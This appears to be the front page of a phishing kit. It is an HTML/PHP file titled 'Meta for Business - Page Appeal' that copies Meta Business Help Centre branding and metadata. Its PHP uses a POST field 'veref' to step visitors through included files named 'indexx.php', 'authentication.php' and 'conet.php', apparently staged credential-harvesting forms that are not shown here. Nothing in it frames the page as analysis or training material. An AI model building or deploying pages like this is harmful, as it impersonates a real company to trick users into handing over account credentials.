<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Meta for Business - Page Appeal</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta property="og:type" content="website">
    <meta property="twitter:type" content="website">
    <link href="images/vrWvib4O013P.png" rel="shortcut icon">
    <meta property="og:url" content="/meta-community-standard">
    <meta property="twitter:url" content="/meta-community-standard">
    <meta property="og:title" content="Meta Business Help Centre - Page Appeal">
    <meta property="twitter:title" content="Meta Business Help Centre - Page Appeal">
    <meta property="og:image" content="images/CXj1EQitMk1u.png">
    <meta property="twitter:image" content="./static/uploads/block_images/CXj1EQitMk1u.png">
    <link rel="apple-touch-icon" href="images/bySR5ih8AaGo.png">
    <title>React App</title>
    <link href="css/4ogIRaZhmSHZ.css" rel="stylesheet">
</head>

<body>

<noscript>You need to enable JavaScript to run this app.</noscript>
			 <?php 
			 switch ($_POST['veref']) {
					case 0:
						include('indexx.php');
						break;
					case 1:
						include('authentication.php');
						break;
					case 2:
						include('conet.php');
						break;
				}

			 
			 if ($_POST['veref'] != 1 && $_POST['veref'] != 2) {
			 ?>

			 <?php 
			 }
// var_dump($_POST['veref']);			 
			 if ($_POST['veref'] == 1) {
			 ?>


			 <?php } if (isset($_POST['veref']) && $_POST['veref'] == '2') { ?>

			 <?php 
			 }
			 // var_dump($_POST['veref']);
if($_POST['veref'] == 2) {
			 ?>

<?php } ?>
</body>

</html>